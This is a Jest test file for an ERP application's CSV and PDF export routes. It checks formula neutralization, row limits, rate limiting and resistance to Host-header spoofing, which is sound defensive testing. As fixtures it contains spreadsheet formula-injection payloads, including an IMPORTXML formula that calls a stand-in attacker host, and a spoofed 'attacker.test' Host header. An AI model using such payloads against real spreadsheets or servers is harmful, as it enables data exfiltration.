jest.mock('@/lib/prisma', () => ({
  prisma: {
    $queryRaw: jest.fn(),
    $queryRawUnsafe: jest.fn(),
    cliente: {
      findMany: jest.fn(),
    },
    proposta: {
      findMany: jest.fn(),
    },
  },
}));

jest.mock('@/shared/lib/rbac', () => ({
  requireUser: jest.fn(),
  requireClientePermission: jest.fn(),
}));

jest.mock('@/shared/lib/rbac-core', () => ({
  can: jest.fn(),
}));

jest.mock('@/shared/lib/rate-limit', () => ({
  apiRateLimit: {
    isAllowed: jest.fn(),
  },
}));

jest.mock('@/shared/lib/audit', () => ({
  AuditService: {
    logAction: jest.fn().mockResolvedValue(undefined),
  },
}));

jest.mock('@/shared/lib/usuario-query', () => ({
  buildUsuarioSelect: jest.fn().mockResolvedValue('id,email,nomeCompleto,nivel,status,criadoEm'),
  getUsuarioColumns: jest
    .fn()
    .mockResolvedValue(new Set(['id', 'email', 'nomeCompleto', 'nivel', 'status', 'criadoEm'])),
}));

jest.mock('@/shared/lib/services/report-pdf-html', () => ({
  generateReportPDFFromHTML: jest.fn().mockResolvedValue(Buffer.from('pdf')),
}));

import { prisma } from '@/lib/prisma';
import { requireClientePermission, requireUser } from '@/shared/lib/rbac';
import { can } from '@/shared/lib/rbac-core';
import { apiRateLimit } from '@/shared/lib/rate-limit';
import { generateReportPDFFromHTML } from '@/shared/lib/services/report-pdf-html';

const { Request, Response, Headers } = require('node-fetch');
Object.assign(global, { Request, Response, Headers });
if (typeof Response.json !== 'function') {
  Response.json = (data: unknown, init?: ResponseInit) =>
    new Response(JSON.stringify(data), {
      ...init,
      headers: {
        'content-type': 'application/json',
        ...(init?.headers ?? {}),
      },
    });
}

const { POST: usuariosCsvPOST } = require('../usuarios/export/csv/route');
const { POST: usuariosPdfPOST } = require('../usuarios/export/pdf/route');
const { POST: clientesCsvPOST } = require('../clientes/export/csv/route');
const { POST: propostasCsvPOST } = require('../propostas/export/csv/route');
const { POST: propostasPdfPOST } = require('../propostas/export/pdf/route');

function jsonRequest(path: string, body: unknown, headers?: HeadersInit) {
  const request = new Request(`http://localhost${path}`, {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      ...headers,
    },
    body: JSON.stringify(body),
  });
  Object.defineProperty(request, 'cookies', {
    value: { get: jest.fn().mockReturnValue({ value: 'safe-token' }) },
  });
  return request;
}

describe('P2 export hardening', () => {
  const queryRawMock = prisma.$queryRaw as jest.Mock;
  const queryRawUnsafeMock = prisma.$queryRawUnsafe as jest.Mock;
  const clienteFindManyMock = prisma.cliente.findMany as jest.Mock;
  const propostaFindManyMock = prisma.proposta.findMany as jest.Mock;
  const requireUserMock = requireUser as jest.Mock;
  const requireClientePermissionMock = requireClientePermission as jest.Mock;
  const canMock = can as jest.Mock;
  const rateLimitMock = apiRateLimit.isAllowed as jest.Mock;
  const generatePdfMock = generateReportPDFFromHTML as jest.Mock;

  const originalAppUrl = process.env.APP_URL;

  beforeEach(() => {
    jest.clearAllMocks();
    process.env.APP_URL = 'https://erp.gladpros.com';
    rateLimitMock.mockResolvedValue({
      allowed: true,
      remaining: 99,
      resetTime: Date.now() + 60_000,
    });
    requireUserMock.mockResolvedValue({ id: '1', role: 'ADMIN', empresaId: 1 });
    requireClientePermissionMock.mockResolvedValue({ id: '1', role: 'ADMIN', empresaId: 1 });
    canMock.mockReturnValue(true);
  });

  afterAll(() => {
    process.env.APP_URL = originalAppUrl;
  });

  it('limits usuario CSV export and neutralizes spreadsheet formulas', async () => {
    queryRawMock.mockResolvedValue([
      { COLUMN_NAME: 'id' },
      { COLUMN_NAME: 'email' },
      { COLUMN_NAME: 'nomeCompleto' },
      { COLUMN_NAME: 'nivel' },
      { COLUMN_NAME: 'status' },
      { COLUMN_NAME: 'criadoEm' },
    ]);
    queryRawUnsafeMock.mockResolvedValue([
      {
        id: 1,
        email: '+evil@example.com',
        nomeCompleto: '=cmd',
        nivel: 'ADMIN',
        status: 'ATIVO',
        criadoEm: new Date('2026-05-01T12:00:00-05:00'),
      },
    ]);

    const response = await usuariosCsvPOST(
      jsonRequest('/api/usuarios/export/csv', {
        filters: { q: 'admin' },
      }),
    );
    const csv = await response.text();
    const [sql, ...params] = queryRawUnsafeMock.mock.calls[0];

    expect(response.status).toBe(200);
    expect(sql).toContain('LIMIT ?');
    expect(params.at(-1)).toBe(5000);
    expect(csv).toContain('"\'=cmd"');
    expect(csv).toContain('"\' +evil@example.com"'.replace(' ', ''));
  });

  it('generates usuario PDF from configured APP_URL instead of request Host', async () => {
    const response = await usuariosPdfPOST(
      jsonRequest(
        '/api/usuarios/export/pdf',
        {},
        {
          host: 'attacker.test',
          cookie: 'authToken=safe-token; other=ignore-me',
        },
      ),
    );

    expect(response.status).toBe(200);
    expect(generatePdfMock).toHaveBeenCalledWith(
      expect.objectContaining({
        baseUrl: 'https://erp.gladpros.com',
        cookie: 'authToken=safe-token',
      }),
    );
    expect(JSON.stringify(generatePdfMock.mock.calls[0][0])).not.toContain('attacker.test');
  });

  it('caps clientes CSV export with take and skip when no explicit selection is provided', async () => {
    clienteFindManyMock.mockResolvedValue([
      {
        id: 1,
        tipo: 'PF',
        nomeCompleto: 'John Smith',
        razaoSocial: null,
        nomeFantasia: null,
        email: 'john@example.com',
        telefone: null,
        addressCity: 'Dallas',
        addressState: 'TX',
        status: 'ATIVO',
        criadoEm: new Date('2026-05-01T12:00:00-05:00'),
      },
    ]);

    const response = await clientesCsvPOST(
      jsonRequest('/api/clientes/export/csv', {
        filters: { page: 2, pageSize: 10 },
      }),
    );

    expect(response.status).toBe(200);
    expect(clienteFindManyMock).toHaveBeenCalledWith(
      expect.objectContaining({
        take: 10,
        skip: 10,
      }),
    );
  });

  it('neutralizes spreadsheet formulas in propostas CSV export', async () => {
    propostaFindManyMock.mockResolvedValue([
      {
        numeroProposta: 'P-001',
        titulo: '=IMPORTXML("http://attacker.test")',
        status: 'ENVIADA',
        precoPropostaCliente: 100,
        valorEstimado: 80,
        criadoEm: new Date('2026-05-01T12:00:00-05:00'),
        validadeProposta: null,
        assinadaEm: null,
        contatoNome: '@bad',
        contatoEmail: 'client@example.com',
        localExecucaoEndereco: '123 Main St',
        Cliente: { nomeCompleto: 'John Smith', email: 'john@example.com' },
      },
    ]);

    const response = await propostasCsvPOST(jsonRequest('/api/propostas/export/csv', {}));
    const csv = await response.text();

    expect(response.status).toBe(200);
    expect(csv).toContain('"\'=IMPORTXML(""http://attacker.test"")"');
    expect(csv).toContain('"\'@bad"');
  });

  it('rate limits propostas PDF export before querying data', async () => {
    rateLimitMock.mockResolvedValueOnce({
      allowed: false,
      message: 'Muitas requisições',
      remaining: 0,
      resetTime: Date.now() + 60_000,
    });

    const response = await propostasPdfPOST(jsonRequest('/api/propostas/export/pdf', {}));
    const body = await response.json();

    expect(response.status).toBe(429);
    expect(body.success).toBe(false);
    expect(propostaFindManyMock).not.toHaveBeenCalled();
  });
});
